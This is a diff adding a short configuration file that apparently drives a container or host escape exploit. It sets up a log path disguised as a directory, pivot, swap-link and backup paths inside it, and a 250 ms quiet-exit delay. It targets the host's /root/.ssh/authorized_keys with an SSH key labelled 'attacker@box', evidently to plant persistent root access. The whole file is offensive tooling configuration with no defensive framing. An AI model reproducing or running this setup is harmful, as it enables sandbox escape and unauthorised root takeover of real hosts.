@@ -1,0 +1,13 @@
+VISIBLE_FILE=/logs/app.log
+BACKING_FILE=/logs/.app.log.regular
+TRIGGER_FILE=/logs/app.log/aaa.txt
+
+# All three must be INSIDE the disguised directory
+PIVOT_DIR=/logs/app.log/escape
+STAGE_LINK=/logs/app.log/.swap-escape
+BACKUP_DIR=/logs/app.log/.old-escape
+
+HOST_TARGET_DIR=/root/.ssh
+HOST_TARGET_FILE=/root/.ssh/authorized_keys
+EXIT_QUIET_MS=250
+SSH_KEY=ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINdOp8L+V1KJcUH4MmKBkwPfF6KfgssrNurdBW3Vlgmt attacker@box
